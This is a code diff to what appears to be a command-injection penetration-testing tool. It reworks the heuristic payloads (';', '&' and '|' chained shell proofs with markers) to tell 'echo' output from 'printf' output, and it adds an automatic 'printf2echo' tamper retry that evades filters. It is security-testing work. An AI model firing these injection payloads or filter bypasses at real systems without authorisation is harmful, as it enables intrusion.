@@ -53,6 +53,12 @@ def basic_payload_generator():
   marker1 = ''.join(random.choice(string.ascii_uppercase) for _ in range(6))
   marker2 = ''.join(random.choice(string.ascii_uppercase) for _ in range(6))
   marker3 = ''.join(random.choice(string.ascii_uppercase) for _ in range(6))
+  # A pair of markers to each repetition below, rather than the one pair to all three, so the
+  # repetition that answered can be told from the ones that did not.
+  marker4 = ''.join(random.choice(string.ascii_uppercase) for _ in range(6))
+  marker5 = ''.join(random.choice(string.ascii_uppercase) for _ in range(6))
+  marker6 = ''.join(random.choice(string.ascii_uppercase) for _ in range(6))
+  marker7 = ''.join(random.choice(string.ascii_uppercase) for _ in range(6))
 
   suffix = ""
   if checks.using_backticks():
@@ -77,9 +83,29 @@ def basic_payload_generator():
     windows_proof = "set /a " + settings.BASIC_STRING
     alter_interpreter_basic_string = " -c \"print(int(" + calc_string + "))\""
 
-  # The same proof behind each separator, printed through the one command checks.print_words() names.
-  posix_proof = checks.print_words(marker1 + settings.CMD_SUB_PREFIX + settings.BASIC_STRING + settings.CMD_SUB_SUFFIX + marker2)
-  settings.BASIC_COMMAND_INJECTION_PAYLOADS = [";" + posix_proof + "&" + posix_proof + "|" + posix_proof,
+  """
+  The same proof behind each separator, and - where nothing has chosen the printing for this run -
+  not all three printed with the same name.
+
+  Both names go into payloads elsewhere one at a time, so a target refusing either refuses every
+  payload carrying it, this test's own included, and the run reads as a parameter with no way in
+  rather than as a name being turned away. Written here with both, each repetition behind its own
+  pair of markers: the repetition that comes back names what the target still prints with, and the
+  test answers at all where it would otherwise have come back empty. The separator varies with it,
+  so which of the two did the work is not settled by one answer - it is read as what is worth
+  trying, not as what was proven. Left alone where the run has a printing of its own, asked for or
+  adopted, since putting the other name back is the opposite of what the script was loaded for.
+
+  The other name goes last rather than in the middle. Written ';A&B|C', the shell hands B's output
+  to C instead of to the page, so B is the one repetition nothing can be read from - measured, the
+  three print 'A C' and never B. The two that are read are the first and the last, so those are
+  the two that carry a name each.
+  """
+  echoed = (True, True, True) if settings.PRINT_WITH_ECHO else (False, False, True)
+  pairs = ((marker1, marker2), (marker4, marker5), (marker6, marker7))
+  proofs = [checks.print_words(opening + settings.CMD_SUB_PREFIX + settings.BASIC_STRING + settings.CMD_SUB_SUFFIX + closing, with_echo=as_echo)
+            for (opening, closing), as_echo in zip(pairs, echoed)]
+  settings.BASIC_COMMAND_INJECTION_PAYLOADS = [";" + proofs[0] + "&" + proofs[1] + "|" + proofs[2],
                                               "|echo " + marker1 + "&" + windows_proof + "&echo " + marker2 +
                                               "&echo " + marker1 + "&" + windows_proof + "&echo " + marker2
                                               ]
@@ -89,7 +115,13 @@ def basic_payload_generator():
                                               "|echo " + marker1 + "&for /f \"tokens=* eol=\" %i in ('cmd /c " + settings.WIN_PYTHON_INTERPRETER + alter_interpreter_basic_string + "') do @set /p=%i" + settings.CMD_NUL + "&echo " + marker2 +
                                               "&echo " + marker1 + "&for /f \"tokens=* eol=\" %i in ('cmd /c " + settings.WIN_PYTHON_INTERPRETER + alter_interpreter_basic_string + "') do @set /p=%i" + settings.CMD_NUL + "&echo " + marker2
                                               ]
-  settings.BASIC_COMMAND_INJECTION_RESULT = re.escape(marker1) + r"\s*" + re.escape(expected) + r"\s*" + re.escape(marker2)
+  def _answer(pair):
+    return re.escape(pair[0]) + r"\s*" + re.escape(expected) + r"\s*" + re.escape(pair[1])
+  # Kept by the name each repetition printed with, so an answer carrying one and not the other says
+  # which is still getting through; the whole of it is what the test itself is read against.
+  settings.BASIC_COMMAND_INJECTION_RESULTS = {"echo": "|".join(_answer(pair) for pair, as_echo in zip(pairs, echoed) if as_echo),
+                                              "printf": "|".join(_answer(pair) for pair, as_echo in zip(pairs, echoed) if not as_echo)}
+  settings.BASIC_COMMAND_INJECTION_RESULT = "|".join(_answer(pair) for pair in pairs)
 
 """
 Initializing basic level check status
@@ -331,6 +363,7 @@ def command_injection_heuristic_basic(url, http_request_method, check_parameter,
             match = re.search(settings.BASIC_COMMAND_INJECTION_RESULT, html_data)
             if match:
               settings.IDENTIFIED_COMMAND_INJECTION = True
+              checks.note_printer_that_answered(html_data)
               # Asked while the payload that answered is still in hand, and before a technique has
               # spent a single request at the slow value's price.
               url = probe_skip_testable_value_early(url, http_request_method, check_parameter, payload, whitespace, place)
@@ -1367,6 +1400,28 @@ def injection_process(url, check_parameter, http_request_method, filename, times
         return settings.DASHLESS_RETRY_CHOICE
 
 
+      """
+      Whether to go around a filter built on what the payloads print with.
+
+      Asked for the same reason the two above are: nothing was confirmed, and that the target
+      refuses the one name and format every POSIX payload carries is the guess that makes another
+      pass worth paying for - so it belongs in the question rather than stated as something found.
+      """
+      def _accepts_printer_retry():
+        if settings.PRINTER_RETRY_CHOICE is None:
+          if settings.PRINTER_ANSWERED == "echo":
+            # The heuristic test went out printing with both names and came back carrying one of
+            # them, so what was found is stated on its own line rather than put in the question -
+            # the choice stays the user's, as it is for every other pass.
+            warn_msg = "The heuristic test answered where it printed with 'echo' only, so 'printf' appears to be filtered."
+            settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
+            message = "Do you want " + settings.APPLICATION + " to enable the 'printf2echo' tamper script? [Y/n] "
+          else:
+            message = "Do you want " + settings.APPLICATION + " to try again in case what the payloads print with "
+            message += "is being filtered (e.g. by using a tamper script that prints with 'echo')? [Y/n] "
+          settings.PRINTER_RETRY_CHOICE = common.read_input(message, default="Y", check_batch=True) not in settings.CHOICE_NO
+        return settings.PRINTER_RETRY_CHOICE
+
       # A filter that rejects any literal whitespace blocks the heuristic test the same as every
       # technique, so gating this on a positive heuristic would never fire for the one case it
       # exists for. 'MULTI_ENCODED_PAYLOAD' already carrying the script is what keeps it from
@@ -1400,6 +1455,18 @@ def injection_process(url, check_parameter, http_request_method, filename, times
         settings.AUTO_TAMPER.append("dashlesstest")
         # Announced the way '--tamper' announces its own, rather than in a sentence of its own:
         # what is loaded is the same thing either way, and worth reading as the same line.
+        checks.tamper_scripts(stored_tamper_scripts=False)
+        _reset_web_root_detection()
+        end_detection = _run_and_verify()
+
+      # The name and the format are in every POSIX payload alike - the heuristic test's own
+      # included - so a filter built on either refuses the lot for the one reason, which reads as a
+      # parameter with no way in rather than as a string being turned away. 'printf2echo' prints
+      # with 'echo' throughout, which is the one other name a payload here can print with.
+      if not end_detection and checks.injection_techniques_status() is False and \
+            _may_adopt_tamper() and "printf2echo" not in settings.MULTI_ENCODED_PAYLOAD and \
+            _accepts_printer_retry():
+        settings.AUTO_TAMPER.append("printf2echo")
         checks.tamper_scripts(stored_tamper_scripts=False)
         _reset_web_root_detection()
         end_detection = _run_and_verify()
